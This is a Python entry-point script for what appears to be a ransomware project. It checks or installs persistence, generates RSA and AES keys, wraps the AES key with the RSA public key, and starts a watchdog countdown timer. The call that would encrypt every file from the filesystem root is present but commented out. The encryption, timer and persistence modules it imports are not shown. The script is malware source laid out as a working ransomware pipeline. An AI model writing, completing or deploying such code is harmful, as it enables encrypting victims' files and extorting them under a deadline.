import multiprocessing
from datetime import datetime, timedelta
from Variables import seconds_left, timer_file_name, script_name_exe
from Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, generate_symmetric_key, encrypt_aes_key_with_rsa, encrypt_user_files
from Timer import save_timer_data, watchdog_timer,load_timer_data
from Persistence import os_check

####################################################################################################################

# Quick check to see if timer data exist or not
timer_data = load_timer_data()
os_check(script_name_exe)

if timer_data:
    print("Timer data exist") # Debug Message
    watchdog_process = multiprocessing.Process(target=watchdog_timer)
    watchdog_process.start()

else:
    print("No Timer Data Exist") # Debug Message
    # Generate the RSA keys
    private_key, public_key = generate_rsa_keys()
    save_rsa_keys(private_key, public_key)

    # Generate the AES key
    symmetric_key = generate_symmetric_key()

    # Encrypt AES key with RSA public key and save it
    encrypted_aes_key = encrypt_aes_key_with_rsa(symmetric_key, public_key)
    save_encrypted_aes_key(encrypted_aes_key)

    # Encrypt all files
    # encrypt_user_files("/", symmetric_key)

    start_time = datetime.now()
    expiration_time = start_time + timedelta(seconds=seconds_left)

    save_timer_data(start_time, expiration_time)

    watchdog_process = multiprocessing.Process(target=watchdog_timer)
    watchdog_process.start()

####################################################################################################################